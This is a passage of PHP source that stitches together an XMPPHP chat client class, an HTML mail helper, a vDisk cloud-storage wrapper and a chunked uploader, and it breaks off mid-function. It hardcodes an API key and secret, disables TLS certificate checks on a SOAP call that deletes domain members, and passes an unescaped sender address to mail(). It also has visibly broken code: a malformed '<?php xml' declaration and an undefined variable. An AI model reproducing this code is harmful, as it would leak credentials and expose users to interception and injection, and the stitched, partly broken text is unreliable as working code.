 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/** XMPPHP_XMLStream */
//require_once dirname(__FILE__) . "/XMLStream.php";
//require_once dirname(__FILE__) . "/Roster.php";

/**
 * XMPPHP Main Class
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_XMPP extends XMPPHP_XMLStream {
        /**
         * @var string
         */
        public $server;

        /**
         * @var string
         */
        public $user;
        
        /**
         * @var string
         */
        protected $password;
        
        /**
         * @var string
         */
        protected $resource;
        
        /**
         * @var string
         */
        protected $fulljid;
        
        /**
         * @var string
         */
        protected $basejid;
        
        /**
         * @var boolean
         */
        protected $authed = false;
        protected $session_started = false;
        
        /**
         * @var boolean
         */
        protected $auto_subscribe = false;
        
        /**
         * @var boolean
         */
        protected $use_encryption = true;
        
        /**
         * @var boolean
         */
        public $track_presence = true;
        
        /**
         * @var object
         */
        public $roster;

        /**
         * Constructor
         *
         * @param string  $host
         * @param integer $port
         * @param string  $user
         * @param string  $password
         * @param string  $resource
         * @param string  $server
         * @param boolean $printlog
         * @param string  $loglevel
         */
        public function __construct($host, $port, $user, $password, $resource, $server = null, $printlog = false, $loglevel = null) {
                parent::__construct($host, $port, $printlog, $loglevel);
                
                $this->user      = $user;
                $this->password = $password;
                $this->resource = $resource;
                if(!$server) $server = $host;
                $this->basejid = $this->user . '@' . $this->host;

                $this->roster = new Roster();
                $this->track_presence = true;

                $this->stream_start = '<stream:stream to="' . $server . '" xmlns:stream="http://etherx.jabber.org/streams" xmlns="jabber:client" version="1.0">';
                $this->stream_end   = '</stream:stream>';
                $this->default_ns   = 'jabber:client';
                
                $this->addXPathHandler('{http://etherx.jabber.org/streams}features', 'features_handler');
                $this->addXPathHandler('{urn:ietf:params:xml:ns:xmpp-sasl}success', 'sasl_success_handler');
                $this->addXPathHandler('{urn:ietf:params:xml:ns:xmpp-sasl}failure', 'sasl_failure_handler');
                $this->addXPathHandler('{urn:ietf:params:xml:ns:xmpp-tls}proceed', 'tls_proceed_handler');
                $this->addXPathHandler('{jabber:client}message', 'message_handler');
                $this->addXPathHandler('{jabber:client}presence', 'presence_handler');
                $this->addXPathHandler('iq/{jabber:iq:roster}query', 'roster_iq_handler');
        }

        /**
         * Turn encryption on/ff
         *
         * @param boolean $useEncryption
         */
        public function useEncryption($useEncryption = true) {
                $this->use_encryption = $useEncryption;
        }
        
        /**
         * Turn on auto-authorization of subscription requests.
         *
         * @param boolean $autoSubscribe
         */
        public function autoSubscribe($autoSubscribe = true) {
                $this->auto_subscribe = $autoSubscribe;
        }

        /**
         * Send XMPP Message
         *
         * @param string $to
         * @param string $body
         * @param string $type
         * @param string $subject
         */
        public function message($to, $body, $type = 'chat', $subject = null, $payload = null) {
            if(is_null($type))
            {
                $type = 'chat';
            }
            
                $to       = htmlspecialchars($to);
                $body   = htmlspecialchars($body);
                $subject = htmlspecialchars($subject);
                
                $out = "<message from=\"{$this->fulljid}\" to=\"$to\" type='$type'>";
                if($subject) $out .= "<subject>$subject</subject>";
                $out .= "<body>$body</body>";
                if($payload) $out .= $payload;
                $out .= "</message>";
                
                $this->send($out);
        }

        /**
         * Set Presence
         *
         * @param string $status
         * @param string $show
         * @param string $to
         */
        public function presence($status = null, $show = 'available', $to = null, $type='available', $priority=0) {
                if($type == 'available') $type = '';
                $to      = htmlspecialchars($to);
                $status = htmlspecialchars($status);
                if($show == 'unavailable') $type = 'unavailable';
                
                $out = "<presence";
                if($to) $out .= " to=\"$to\"";
                if($type) $out .= " type='$type'";
                if($show == 'available' and !$status) {
                        $out .= "/>";
                } else {
                        $out .= ">";
                        if($show != 'available') $out .= "<show>$show</show>";
                        if($status) $out .= "<status>$status</status>";
                        if($priority) $out .= "<priority>$priority</priority>";
                        $out .= "</presence>";
                }
                
                $this->send($out);
        }
        /**
         * Send Auth request
         *
         * @param string $jid
         */
        public function subscribe($jid) {
                $this->send("<presence type='subscribe' to='{$jid}' from='{$this->fulljid}' />");
                #$this->send("<presence type='subscribed' to='{$jid}' from='{$this->fulljid}' />");
        }

        /**
         * Message handler
         *
         * @param string $xml
         */
        public function message_handler($xml) {
                if(isset($xml->attrs['type'])) {
                        $payload['type'] = $xml->attrs['type'];
                } else {
                        $payload['type'] = 'chat';
                }
                $payload['from'] = $xml->attrs['from'];
                $payload['body'] = $xml->sub('body')->data;
                $payload['xml'] = $xml;
                $this->log->log("Message: {$xml->sub('body')->data}", XMPPHP_Log::LEVEL_DEBUG);
                $this->event('message', $payload);
        }

        /**
         * Presence handler
         *
         * @param string $xml
         */
        public function presence_handler($xml) {
                $payload['type'] = (isset($xml->attrs['type'])) ? $xml->attrs['type'] : 'available';
                $payload['show'] = (isset($xml->sub('show')->data)) ? $xml->sub('show')->data : $payload['type'];
                $payload['from'] = $xml->attrs['from'];
                $payload['status'] = (isset($xml->sub('status')->data)) ? $xml->sub('status')->data : '';
                $payload['priority'] = (isset($xml->sub('priority')->data)) ? intval($xml->sub('priority')->data) : 0;
                $payload['xml'] = $xml;
                if($this->track_presence) {
                        $this->roster->setPresence($payload['from'], $payload['priority'], $payload['show'], $payload['status']);
                }
                $this->log->log("Presence: {$payload['from']} [{$payload['show']}] {$payload['status']}",  XMPPHP_Log::LEVEL_DEBUG);
                if(array_key_exists('type', $xml->attrs) and $xml->attrs['type'] == 'subscribe') {
                        if($this->auto_subscribe) {
                                $this->send("<presence type='subscribed' to='{$xml->attrs['from']}' from='{$this->fulljid}' />");
                                $this->send("<presence type='subscribe' to='{$xml->attrs['from']}' from='{$this->fulljid}' />");
                        }
                        $this->event('subscription_requested', $payload);
                } elseif(array_key_exists('type', $xml->attrs) and $xml->attrs['type'] == 'subscribed') {
                        $this->event('subscription_accepted', $payload);
                } else {
                        $this->event('presence', $payload);
                }
        }

        /**
         * Features handler
         *
         * @param string $xml
         */
        protected function features_handler($xml) {
                if($xml->hasSub('starttls') and $this->use_encryption) {
                        $this->send("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required /></starttls>");
                } elseif($xml->hasSub('bind') and $this->authed) {
                        $id = $this->getId();
                        $this->addIdHandler($id, 'resource_bind_handler');
                        $this->send("<iq xmlns=\"jabber:client\" type=\"set\" id=\"$id\"><bind xmlns=\"urn:ietf:params:xml:ns:xmpp-bind\"><resource>{$this->resource}</resource></bind></iq>");
                } else {
                        $this->log->log("Attempting Auth...");
                        if ($this->password) {
                        $this->send("<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>" . base64_encode("\x00" . $this->user . "\x00" . $this->password) . "</auth>");
                        } else {
                        $this->send("<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='ANONYMOUS'/>");
                        }       
                }
        }

        /**
         * SASL success handler
         *
         * @param string $xml
         */
        protected function sasl_success_handler($xml) {
                $this->log->log("Auth success!");
                $this->authed = true;
                $this->reset();
        }
        
        /**
         * SASL feature handler
         *
         * @param string $xml
         */
        protected function sasl_failure_handler($xml) {
                $this->log->log("Auth failed!",  XMPPHP_Log::LEVEL_ERROR);
                $this->disconnect();
                
                throw new XMPPHP_Exception('Auth failed!');
        }

        /**
         * Resource bind handler
         *
         * @param string $xml
         */
        protected function resource_bind_handler($xml) {
                if($xml->attrs['type'] == 'result') {
                        $this->log->log("Bound to " . $xml->sub('bind')->sub('jid')->data);
                        $this->fulljid = $xml->sub('bind')->sub('jid')->data;
                        $jidarray = explode('/',$this->fulljid);
                        $this->jid = $jidarray[0];
                }
                $id = $this->getId();
                $this->addIdHandler($id, 'session_start_handler');
                $this->send("<iq xmlns='jabber:client' type='set' id='$id'><session xmlns='urn:ietf:params:xml:ns:xmpp-session' /></iq>");
        }

        /**
        * Retrieves the roster
        *
        */
        public function getRoster() {
                $id = $this->getID();
                $this->send("<iq xmlns='jabber:client' type='get' id='$id'><query xmlns='jabber:iq:roster' /></iq>");
        }

        /**
        * Roster iq handler
        * Gets all packets matching XPath "iq/{jabber:iq:roster}query'
        *
        * @param string $xml
        */
        protected function roster_iq_handler($xml) {
                $status = "result";
                $xmlroster = $xml->sub('query');
                foreach($xmlroster->subs as $item) {
                        $groups = array();
                        if ($item->name == 'item') {
                                $jid = $item->attrs['jid']; //REQUIRED
                                $name = $item->attrs['name']; //MAY
                                $subscription = $item->attrs['subscription'];
                                foreach($item->subs as $subitem) {
                                        if ($subitem->name == 'group') {
                                                $groups[] = $subitem->data;
                                        }
                                }
                                $contacts[] = array($jid, $subscription, $name, $groups); //Store for action if no errors happen
                        } else {
                                $status = "error";
                        }
                }
                if ($status == "result") { //No errors, add contacts
                        foreach($contacts as $contact) {
                                $this->roster->addContact($contact[0], $contact[1], $contact[2], $contact[3]);
                        }
                }
                if ($xml->attrs['type'] == 'set') {
                        $this->send("<iq type=\"reply\" id=\"{$xml->attrs['id']}\" to=\"{$xml->attrs['from']}\" />");
                }
        }

        /**
         * Session start handler
         *
         * @param string $xml
         */
        protected function session_start_handler($xml) {
                $this->log->log("Session started");
                $this->session_started = true;
                $this->event('session_start');
        }

        /**
         * TLS proceed handler
         *
         * @param string $xml
         */
        protected function tls_proceed_handler($xml) {
                $this->log->log("Starting TLS encryption");
                stream_socket_enable_crypto($this->socket, true, STREAM_CRYPTO_METHOD_SSLv23_CLIENT);
                $this->reset();
        }

        /**
        * Retrieves the vcard
        *
        */
        public function getVCard($jid = Null) {
                $id = $this->getID();
                $this->addIdHandler($id, 'vcard_get_handler');
                if($jid) {
                        $this->send("<iq type='get' id='$id' to='$jid'><vCard xmlns='vcard-temp' /></iq>");
                } else {
                        $this->send("<iq type='get' id='$id'><vCard xmlns='vcard-temp' /></iq>");
                }
        }

        /**
        * VCard retrieval handler
        *
        * @param XML Object $xml
        */
        protected function vcard_get_handler($xml) {
                $vcard_array = array();
                $vcard = $xml->sub('vcard');
                // go through all of the sub elements and add them to the vcard array
                foreach ($vcard->subs as $sub) {
                        if ($sub->subs) {
                                $vcard_array[$sub->name] = array();
                                foreach ($sub->subs as $sub_child) {
                                        $vcard_array[$sub->name][$sub_child->name] = $sub_child->data;
                                }
                        } else {
                                $vcard_array[$sub->name] = $sub->data;
                        }
                }
                $vcard_array['from'] = $xml->attrs['from'];
                $this->event('vcard', $vcard_array);
        }
}

class mail_class{
// 对邮件地址进行中文的UTF-8编码转化
function format_mail_address($address,$codebase){
  if(preg_match("|<([^<]+)>|", $address, $matches)){
    $name = mb_substr($address, 0, strpos($address, '<'));
    $name = trim($name);
    $mail = $matches[1];
  	if (strtolower($codebase) == 'utf-8'){
    	$address = "=?UTF-8?B?".base64_encode($name)."?= " . "<$mail>";
  	}
  	elseif (strtolower($codebase) == 'gb2312'){	
    	$address = "=?gb2312?B?".base64_encode($name)."?= " . "<$mail>";
  	}    
  }
  return $address;
}

// 发送html格式的邮件
function html_mail($from, $to, $subject, $body, $codebase){
  if(preg_match("|<([^<]+)>|", $from, $matches)){
    $from_name = mb_substr($from, 0, strpos($from, '<'));
    $from_mail = $matches[1];
    if (strtolower($codebase) == 'utf-8'){
    	$from = "=?UTF-8?B?".base64_encode($from_name)."?= " . "<$from_mail>";
    }
    elseif (strtolower($codebase) == 'gb2312'){
    	$from = "=?gb2312?B?".base64_encode($from_name)."?= " . "<$from_mail>";
    }
  }else{
    $from_mail = $from;
  }
  $headers[] = "From: $from";
  $headers[] = "X-Mailer: PHP";
  $headers[] = "MIME-Version: 1.0";
  if (strtolower($codebase) == 'utf-8'){
  	$headers[] = "Content-type: text/html; charset=utf8";
  }
  elseif (strtolower($codebase) == 'gb2312'){
  	$headers[] = "Content-type: text/html; charset=gb2312";
  }  
  $headers[] = "Reply-To: $from_mail";
  if (strtolower($codebase) == 'utf-8'){
  	$subject = "=?UTF-8?B?".base64_encode($subject)."?=";
  }
  elseif (strtolower($codebase) == 'gb2312'){
  	$subject = "=?gb2312?B?".base64_encode($subject)."?=";
  }  

  if(is_array($to)){
    foreach($to as $mail)
      $to_mails[] = $this->format_mail_address($mail,$codebase);
    $to = join(", ", $to_mails);
  }
  mail($to, $subject, $body, join("\r\n", $headers), "-f $from_mail");
}

//函数使用可以参照下面的例子：
//html_mail(
//    "老谷自言自语 <admin@yorkgu.me>",
//    array(
//        "用户A <user1@gmail.com>",
//        "用户B <user2@163.com>"),
//    "这是一封测试邮件",
//    "<html><body><h1 style='color:red'>
//      感谢党，感谢政府，感谢大中华局域网，给我这个发送邮件的机会。
//    </h1></body></html>"
//);
}

?>

<?php 
class vdisk_class{

var $appkey = '22077850';
var $appsecret = '78c08fec8bb57ec38df294bd8f6fd186';

public function cons_define()
	{	
define(URL_GET_TOKEN, 'http://openapi.vdisk.me/?m=auth&a=get_token');
define(URL_KEEP_TOKEN, 'http://openapi.vdisk.me/?m=user&a=keep_token');
define(URL_UPLOAD_FILE, 'http://openapi.vdisk.me/?m=file&a=upload_file');
define(URL_UPLOAD_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=upload_share_file');
define(URL_CREATE_DIR, 'http://openapi.vdisk.me/?m=dir&a=create_dir');
define(URL_GET_LIST, 'http://openapi.vdisk.me/?m=dir&a=get_list');
define(URL_GET_QUOTA, 'http://openapi.vdisk.me/?m=file&a=get_quota');
define(URL_UPLOAD_WITH_SHA1, 'http://openapi.vdisk.me/?m=file&a=upload_with_sha1');
define(URL_GET_FILE_INFO, 'http://openapi.vdisk.me/?m=file&a=get_file_info');
define(URL_DELETE_DIR, 'http://openapi.vdisk.me/?m=dir&a=delete_dir');
define(URL_DELETE_FILE, 'http://openapi.vdisk.me/?m=file&a=delete_file');
define(URL_COPY_FILE, 'http://openapi.vdisk.me/?m=file&a=copy_file');
define(URL_MOVE_FILE, 'http://openapi.vdisk.me/?m=file&a=move_file');
define(URL_RENAME_FILE, 'http://openapi.vdisk.me/?m=file&a=rename_file');
define(URL_RENAME_DIR, 'http://openapi.vdisk.me/?m=dir&a=rename_dir');
define(URL_MOVE_DIR, 'http://openapi.vdisk.me/?m=dir&a=move_dir');
define(URL_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=share_file');
define(URL_CANCEL_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=cancel_share_file');
define(URL_RECYCLE_GET_LIST, 'http://openapi.vdisk.me/?m=recycle&a=get_list');
define(URL_TRUNCATE_RECYCLE_GET, 'http://openapi.vdisk.me/?m=recycle&a=truncate_recycle');
define(URL_RECYCLE_DELETE_FILE, 'http://openapi.vdisk.me/?m=recycle&a=delete_file');
define(URL_RECYCLE_DELETE_DIR, 'http://openapi.vdisk.me/?m=recycle&a=delete_dir');
define(URL_RECYCLE_RESTORE_FILE, 'http://openapi.vdisk.me/?m=recycle&a=restore_file');
define(URL_RECYCLE_RESTORE_DIR, 'http://openapi.vdisk.me/?m=recycle&a=restore_dir');
define(URL_GET_DIRID_WITH_PATH, 'http://openapi.vdisk.me/?m=dir&a=get_dirid_with_path');
define(URL_EMAIL_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=email_share_file');
}

function vdiskupload($uname,$pwd,$filepath,$dirid)
	{
		$vdisk = new vDisk($this->appkey, $this->appsecret);
		$this->cons_define();
		$vdisk->get_token($uname, $pwd);
		$vdisk->keep_token();

if($vdisk->upload_file($filepath, 0))
{
	return 1;
} 
else 
{
	return 0;
}
	}

/**
 * 大文件上传, 命令行方式执行 
 *
 * php uploader <file> <dir_id> [force:0/1]
 *
 * @param string $argv[1] 文件的真实路径
 * @param string $argv[2] 要上传到微盘的目录id
 * @param string $argv[3] 是否强制重传. 1: 重传; 0: 断点续传; 默认为: 0
 * 
 * @author Bruce Chen
 *
 */

function vdiskxupload($uname,$pwd,$filepath,$dirid)
{

$this->cons_define();
$vdisk = new vDisk($this->appkey, $this->appsecret);
$vdisk->get_token($uname, $pwd);
$uploader = new vDiskUpload($this->appkey, $this->appsecret, $vdisk->token);

$uploader->setDebugOn(); 								//调试模式
$uploader->setProgressOn(); 							//显示上传进度
$uploader->setProgressStep(1); 							//进度的Step
$uploader->setChunkSize(1024*1024*10);					//分隔大小
//$uploader->setProxy($host, $port, $user, $passwd);	//设置代理


//默认为续传, 如果要强制重新上传, 则设置第三个参数为: 1
if(!$uploader->upload($filepath, 0, 0))
{
	//echo $uploader->errno(). " ". $uploader->error(). "\n";
	return 0;
} 
else 
{
	return 1;
}
}	
	
function vdisklogin($page,$pagesize,$uname,$pwd,$dirid){
	
		$vdisk = new vDisk($this->appkey, $this->appsecret);
		$this->cons_define();
		$vdisk->get_token($uname, $pwd);
		
		$vdisk->keep_token();
				
    	    	$vdisklist = array();
    	    	$vdiskarray = array();
    	    	$vdiskarray = $vdisk->get_list($dirid);
   	     	$vdisklist['length'] = count($vdiskarray['data']);
      
    	    	if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $vdisklist['length'];
   	     	$totalitem = $vdisklist['length'];
   	     	if (fmod($totalitem, $pagesize) == 0){
   	             $totalpage=$totalitem/$pagesize;
     	   	}       
     	   	else{
     	           $totalpage=ceil($totalitem/$pagesize);
    	    	}       
  	      	if ($totalpage == $page)
  	              $endid = $totalitem-1;
  	      	elseif ($totalpage > $page)
	                $endid = floor($strpagesize*($page)-1);
 	       	elseif ($totalpage < $page){
 	               $endid = floor($strpagesize*($page-1)-1);
 	       	}                       
		
        	for($i = $strpagesize*($page-1);$i <= $endid;$i++){
        		if(($vdiskarray['data'][$i]['size'])&&($vdiskarray['data'][$i]['size'])){
                        	$vdisklist['data'][$i]['type'] = 'file';
                        	$vdisklist['data'][$i]['fileid'] = $vdiskarray['data'][$i]['id'];
                        	$vdisklist['data'][$i]['filename'] = $vdiskarray['data'][$i]['name'];
                        	$vdisklist['data'][$i]['filedirid'] = $vdiskarray['data'][$i]['dir_id'];
                        	$vdisklist['data'][$i]['filectime'] = $vdiskarray['data'][$i]['ctime'];
                        	$vdisklist['data'][$i]['fileltime'] = $vdiskarray['data'][$i]['ltime'];
                        	$vdisklist['data'][$i]['filesize'] = $vdiskarray['data'][$i]['size'];
                        	$vdisklist['data'][$i]['filetype'] = $vdiskarray['data'][$i]['type'];
                        	$vdisklist['data'][$i]['filemd5'] = $vdiskarray['data'][$i]['md5'];
                        	$vdisklist['data'][$i]['filesha1'] = $vdiskarray['data'][$i]['sha1'];
                        	$vdisklist['data'][$i]['filehid'] = $vdiskarray['data'][$i]['hid'];
                        	$vdisklist['data'][$i]['filelength'] = $vdiskarray['data'][$i]['length'];
                        	$vdisklist['data'][$i]['fileurl'] = $vdiskarray['data'][$i]['url'];
                        }
                        else{
                         	$vdisklist['data'][$i]['type'] = 'dir';
                       		$vdisklist['data'][$i]['dirid'] = $vdiskarray['data'][$i]['id'];                        
                        	$vdisklist['data'][$i]['dirname'] = $vdiskarray['data'][$i]['name'];
                        	$vdisklist['data'][$i]['dirpid'] = $vdiskarray['data'][$i]['pid'];
                        	$vdisklist['data'][$i]['dirctime'] = $vdiskarray['data'][$i]['ctime'];
                        	$vdisklist['data'][$i]['dirltime'] = $vdiskarray['data'][$i]['ltime'];
                        	$vdisklist['data'][$i]['dirfilenum'] = $vdiskarray['data'][$i]['file_num'];
                        	$vdisklist['data'][$i]['dirdirnum'] = $vdiskarray['data'][$i]['dir_num'];
                        }	
        	}		
		return $vdisklist;
		//return $vdiskarray;	
}

function vdiskallremove($uname,$pwd,$type,$id,$postfield){
			
        //print_r($this->appkey.$this->appsecret.$postfield);
        //print_r($postfield);
        	
	$vdisk = new vDisk($this->appkey, $this->appsecret);
	$this->cons_define();
	$vdisk->get_token($uname, $pwd);
		
	$vdisk->keep_token();
	//echo $vdisk->token;

    	$vdisklist = array();
    	$vdiskarray = array();             
        if ($type != "" && $id != "" && count($postfield) == 0){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
            
                }       
                else{   
			if($type == 'dir'){
				$vdiskarray = $vdisk->delete_dir($id);
			}
			elseif($type == 'file'){
				$vdiskarray = $vdisk->delete_file($id);			
			}	
                }
        }
        elseif ($type == "all" && count($postfield) > 0){
                //echo 'eee';
        
                for($i = 0;$i <= count($postfield);$i++){
                        if ($postfield["chidd".$i] != ""){
                                //return 'hhh';
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlcode = "200";
                                        $msg = "ok";
                                        //return 'ggg';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $SoapRequest = '<?php xml version="1.0" encoding="utf-8"?>'.
                                                        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                                        '<soap:Header>'.
                                                        '<ManageDomain2Authorization xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                                        '<authorizationType>PassportTicket</authorizationType>'.
                                                        '<authorizationData>'.htmlspecialchars(trim($_SESSION["live"]["authdata"])).'</authorizationData>'.
                                                        '</ManageDomain2Authorization>'.
                                                        '</soap:Header>'.
                                                        '<soap:Body>'.
                                                        '<DeleteMember xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                                        '<memberNameIn>'.trim($postfield["chidd".$i]).'</memberNameIn>'.
                                                        '</DeleteMember>'.
                                                        '</soap:Body>'.                                 
                                                        '</soap:Envelope>';
                                        //echo $SoapRequest;            
                                        //return $SoapRequest;
                                        $url = "https://domains.live.com/service/managedomain2.asmx";
                                        $header = array(
                                                        'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/DeleteMember',
                                                        'Content-Type: text/xml; charset=utf-8',
                                                        'Content-length: '.strlen($SoapRequest),
                                                        'Host: domains.live.com'
                                        );      
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                        $msg = "ok";            
                                        curl_close($ch);        
                                        //return $xmlcode;      
                                }
                                if ($xmlcode == "200" && $msg == "ok"){
                                }
                                else{
                                        break;
                                }       
                        }       
                }                             
        }
        return $vdiskarray;
}

}
?>

<?php 

class vDiskUpload {

	const Path = "/uploader";
	const Host = "upload.sae.sina.com.cn";
	const SessionFileSuffix = ".session";
	const CacheExtraFileSuffix = ".extra";

	const Ok             = 0;
	const SessionFinish  = 1;
	const FileRangeOnly  = 2;
	const Error          = 100;
	const FileRangeError = 105;
	const InternalError  = 500;
	const FatalInternalError = 501;
	const UserTokenError = 800;

	const FileStatError  = 600;
	const FileOpenError  = 601;
	const FileReadError  = 602;
	const AddedInfoError = 603;

	const NetError       = 700;

	public function __construct($accesskey, $secretkey, $user_token) {
	
		$this->accesskey_ = $accesskey;	
		$this->secretkey_ = $secretkey;

		$this->chunkSize_ = 1024 * 1024;
		$this->useRest_ = true;

		$this->errno_ = 0;
		$this->error_ = null;
		$this->debug_ = false;
		$this->showProgress_ = false;
		$this->progressStep_ = 1;

		$this->proxyHost_ = null;
		$this->proxyPort_ = null;
		$this->proxyUser_ = null;
		$this->proxyPasswd_ = null;
		
		$this->user_token = $user_token;
	}

	public function __destruct() {
		// do nothing
	}

	public function setProxy($proxyHost, $proxyPort, $proxyUser = null, $proxyPasswd = null) {
	
		$this->proxyHost_ = $proxyHost;
		$this->proxyPort_ = $proxyPort;
		$this->proxyUser_ = $proxyUser;
		$this->proxyPasswd_ = $proxyPasswd;
	}

	public function setAccesskey($accesskey) {
	
		$this->accesskey_ = $accesskey;
	}

	public function setSecretkey($secretkey) {
	
		$this->secretkey_ = $secretkey;	
	}

	public function setDebugOn() {
	
		$this->debug_ = true;	
	}

	public function setDebugOff() {
	
		$this->debug_ = false;	
	}

	public function setChunkSize($chunkSize) {
	
		$this->chunkSize_ = $chunkSize;
	}

	public function setProgressOn() {
	
		$this->showProgress_ = true;
	}

	public function setProgressOff() {
	
		$this->showProgress_ = false;
	}

	public function setProgressStep($step) {
	
		if ($step > 0 && $step < 100)
			$this->progressStep_ = $step;	
	}

	public function upload($file, $dir_id, $force = false) {
	
		$stat = stat($file);
		if ($stat == false) {
		
			$this->setError(FileStatError, "$file stat error");
			return false;
		}
		
		
		$vdisk = new vDisk($this->accesskey_, $this->secretkey_);
		$the_result = $vdisk->keep_token($this->user_token);
		if($the_result && is_array($the_result) && $the_result['err_code'] == 0 && $the_result['data']['uid'] > 0)
		{
			$uid = $the_result['data']['uid'];
		}
		else
		{
			$this->setError(UserTokenError, "user_token[{$this->user_token}] invalid");
			return false;
		}

		$filename = basename($file);
		$file_md5 = md5_file($file);
		$file_sha1 = sha1_file($file);
		$filename_hash = 100000 + $uid.'/'.$file_sha1;
		$session_name = $filename.'_'.$dir_id.'_'.$file_sha1;
		
		
		//无文件上传
		$upload_with_md5_result = $vdisk->upload_with_sha1($filename, $file_sha1, $dir_id);
		if($vdisk->errno() == 0) return 1;
		
		
		$extra = new FUploadExtra();
		$extra->storengine("s3");
		$extra->domain("wepan.cloudboxapi");
		
		if($force || !$this->getCacheExtra($session_name))
		{	
			$this->delCacheExtra($session_name);
			$time = time();
			$the_user_token = $this->user_token;
			$this->setCacheExtra($session_name, $time.'|'.$the_user_token);
		}
		else
		{	
			$the_string = $this->getCacheExtra($session_name);
			$the_arr = explode('|', $the_string);
			$time = $the_arr[0];
			$the_user_token = $the_arr[1];
		}
		
		
		$opt['callback'] = "http://openapi.vdisk.me/?m=file&a=big_file_upload_callback&file_sha1={$file_sha1}&file_name=".urlencode($filename)."&file_size={$stat['size']}&dir_id={$dir_id}&uid={$uid}&token={$this->user_token}&time={$time}&key=".md5("{$uid}|{$the_user_token}|{$dir_id}|{$filename}|{$file_sha1}|{$stat['size']}|{$time}");
		
		$this->accesskey_ .= "|".$the_user_token."|".$time;
		
		$addedInfo = $extra->toString($opt);

		if ($addedInfo && strstr($addedInfo, "\r\n")) {
			$this->setError(AddedInfoError, "$addedInfo contains '\r\n'");	
			return false;
		}

		if ($force) {
			$this->delSession($session_name);
			$token = 0;
		} else {
			$token = $this->getSession($session_name);
			// if no session exist
			if (!$token) $token = 0;
		}

		$fp = fopen($file, "r");
		if (!$fp) {
			$this->setError(self::FileOpenError, "$file open error");
			return false;
		}

		list($first, $resuming) = ($token != 0) ? array(false, true) : array(true, false);
		list($begin, $end) = ($first) ? array(0, $this->chunkSize_ < $stat["size"] ? $this->chunkSize_ : $stat["size"]) : array(0, 0);

		$finished = 0;
		$lastRatio = 0;
		while (!$finished) {
			$headers = array();
			$this->setHeader($headers, "Host", self::Host);
			$this->setHeader($headers, "FileName", $filename_hash);
			$this->setHeader($headers, "Filesize", $stat["size"]);
			$this->setHeader($headers, "Expect", "");

			if ($this->useRest_) $this->setHeader($headers, "UseRest", 1);

			// set AddedInfo
			if ($addedInfo) $this->setHeader($headers, "Extra", $addedInfo);

			// set Content-Type
			if (!$resuming) {
				$this->setHeader($headers, "Content-Type", "application/octet-stream");
			}

			// set FileRange
			if (!$resuming) {
				$this->setHeader($headers, "FileRange", "$begin-$end");
			} else {
				$this->setHeader($headers, "FileRange", "0");
			}

			// get FileRange content
			if (!$resuming) {
				$content = $this->getContent($fp, $begin, $end - $begin);
				if (!$content) {
					$this->setError(self::FileReadError, "$file read error");	
					fclose($fp);
					return false;
				}
				// set Content-Length
				$this->setHeader($headers, "Content-Length", $end - $begin);
			}

			// set FileRangeChecksum
			$checksum = (!$resuming) ? md5($content) : time();
			$this->setHeader($headers, "FileRangeChecksum", $checksum);

			// set AccessKey
			$this->setHeader($headers, "AccessKey", $this->accesskey_);

			// set Signature;
			$this->setHeader($headers, "Signature", $this->signature($checksum));

			// set Token
			$this->setHeader($headers, "Token", $token);

			// set Agent
			$this->setHeader($headers, "User-Agent", "vDiskSdk");

			if ($this->debug_) {
				echo "[debug] ";
				print_r($headers);
				echo "[debug] transfer $begin - $end\n";
			}

			# proxy
			if ($this->proxyHost_) {
				$host = $this->proxyHost_;
				$port = $this->proxyPort_;
				$path = "http://" . self::Host . self::Path;
				$this->setHeader($headers, "Proxy-Authorization", "Basic" . base64_encode($this->proxyUser_ . ":" . $this->proxyPasswd_));	
			} else {
				$host = self::Host;
				$port = 80;
				$path = self::Path;
			}

			# open socket
